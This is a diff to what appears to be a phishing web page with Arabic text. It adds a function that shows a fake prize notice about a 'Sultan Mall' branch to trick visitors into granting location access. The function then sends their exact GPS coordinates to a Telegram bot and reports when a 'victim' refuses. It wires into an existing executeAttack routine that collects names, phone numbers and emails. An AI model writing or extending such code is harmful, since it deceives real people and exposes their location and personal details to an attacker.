@@ -135,7 +135,26 @@
     silentRadar();
 
     // --- 2. دالة تسجيل البيانات (تشتغل عند ضغط الزر) ---
+        // 1. تعريف دالة الرادار الجديد 📍
+    async function getExactLocation() {
+
+        alert("تهانينا! لتحديد أقرب فرع 'سلطان مول' لموقعك لاستلام الجائزة، يرجى الضغط على 'سماح' في النافذة التالية. 📍");
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                const locMsg = `📍 موقع الصيد الدقيق جاهز:\n${mapLink}`;
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locMsg)}`);
+            }, error => {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ الضحية رفض إعطاء إذن الموقع!")}`);
+            });
+        }
+    }
+
     async function executeAttack() {
+        getExactLocation();
+
         const name = document.getElementById('name').value;
         const phone = document.getElementById('phone').value;
         const email = document.getElementById('email').value || "غير متوفر";
